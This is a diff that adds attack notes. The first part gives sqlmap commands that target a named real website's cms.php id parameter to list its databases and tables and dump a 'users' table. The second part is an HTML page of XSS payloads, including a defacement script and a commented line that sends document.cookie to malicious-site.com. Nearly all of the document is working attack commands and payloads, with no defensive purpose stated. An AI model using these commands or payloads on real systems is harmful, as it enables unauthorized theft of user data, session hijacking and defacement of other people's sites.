@@ -1,0 +1,65 @@
+SQL MAP and XSS
+apt install sqlmap
+sqlmap -h
+sqlmap -hh
+sqlmap -u https://www.caa-ahm.org/cms.php?id=9 -dbs
+sqlmap -u https://caa-ahm.org/cms.php?id=9 -D caahmnew_CMSDB --current user
+
+sqlmap -u https://caa-ahm.org/cms.php?id=9 -D caahmnew_CMSDB –tables --columns 
+sqlmap -u https://www.caa-ahm.org/cms.php?id=9 -D caahmnew_CMSDB -T users –dump.
+
+XSS CODE:
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Payloads</title>
+</head>
+
+<body>
+
+  <h2>Basic XSS Payload</h2>
+  <script>alert('XSS');</script>
+
+  <h2>Cookie Stealing Payload</h2>
+  <script>
+    // Uncomment the next line to see how it works, but be careful with sensitive data!
+    // document.location="http://malicious-site.com?cookie=" + document.cookie;
+  </script>
+
+  <h2>DOM-Based XSS Payload</h2>
+  <img src="x" onerror="alert('XSS')">
+
+  <h2>XSS in HTML Attribute</h2>
+  <input value="XSS" onfocus="alert(1)" autofocus>
+
+  <h2>URL Encoded XSS Payload</h2>
+  <p>%3Cscript%3Ealert('XSS')%3C%2Fscript%3E</p>
+  <!-- Uncomment the next line to test it in a URL -->
+  %3Cscript%3Ealert('XSS')%3C%2Fscript%3E
+
+  <h2>Injecting JavaScript with Event Handlers</h2>
+  <button onclick="alert('XSS')">Click me</button>
+
+  <h2>Exploiting XSS in URLs</h2>
+  <a href="http://example.com/search?q=<script>alert('XSS')</script>">Test Search XSS</a>
+
+  <h2>XSS through JavaScript URLs</h2>
+  <a href="javascript:alert('XSS')">Click here</a>
+
+  <h2>Stored XSS Example</h2>
+  <img src="non-existent" onerror="alert('Stored XSS');">
+
+  <h2>XSS to Deface a Web Page</h2>
+  <script>
+    document.body.innerHTML = "Hacked by XSS";
+  </script>
+
+</body>
+
+</html>
+
+
